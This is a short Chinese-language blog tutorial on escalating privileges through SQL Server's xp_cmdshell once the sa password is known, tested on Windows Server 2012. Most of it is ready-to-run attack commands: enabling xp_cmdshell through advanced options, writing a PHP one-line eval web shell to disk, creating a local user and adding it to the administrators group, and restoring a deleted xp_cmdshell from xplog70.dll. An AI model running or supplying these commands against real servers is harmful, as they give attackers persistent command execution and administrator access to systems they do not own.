    xp_cmdshell提权

    提权 提权
    创建时间:2019-07-30 15:58
    字数:455 阅读:
    评论:
    1. 前言
    2. 利用过程

    前言

    xp_cmdshell是Sql Server中的一个组件，可以用来执行系统命令，在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权。

    测试环境：

    Windows Server 2012 
Sql Server 2012

    利用过程

    1. 查看xp_cmdshell状态

      右击实例名，选择“方面”

      选择外围应用适配器

      可以看到xp_cmdshell是关闭状态

      通过sql指令来查看是否存在xp_cmdshell
      右击实例名，新建查询，执行下面指令：

      select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'

      返回结果是 1

    2. 开启xp_cmdshell

      执行下面指令：

      EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
GO

      可以看到报错提示xp_cmdshell不存在也可能是高级选项

      前面已经通过命令查询存在xp_cmdshell组件，那只可能是高级选项
      通过命令开启允许编辑高级选项，命令如下:

      EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO

      然后再去开启xp_cmdshell

    3. 通过xp_cmdshell执行系统命令

      写入一句话木马

      exec master..xp_cmdshell "echo ^<?php @eval($_POST['cmd']);?^> > C:\\test\\cmd.php"

      在这个地方，出了一点问题：

      ①写入的一句话木马中的两个 ^ 是什么意思？ 有什么作用？
      ②后面的创建文件的路径，如果直接写成 C:\\cmd.php 会提示拒绝访问，但是如果写成 C:\\test\\cmd.php 却可以创建成功。难道是不能写在根目录？还是没有权限？

      创建管理员账户

      exec master..xp_cmdshell 'net user test 123456 /add'
exec master..xp_cmdshell 'net localgroup administrators test /add'

      恢复

      如果xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复，恢复语句：

      Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'

    4. 关闭xp_cmdshell

      EXEC sp_configure 'xp_cmdshell', 0
GO
RECONFIGURE
GO

      关闭高级选项类似

      EXEC sp_configure 'show advanced options', 0
GO
RECONFIGURE
GO
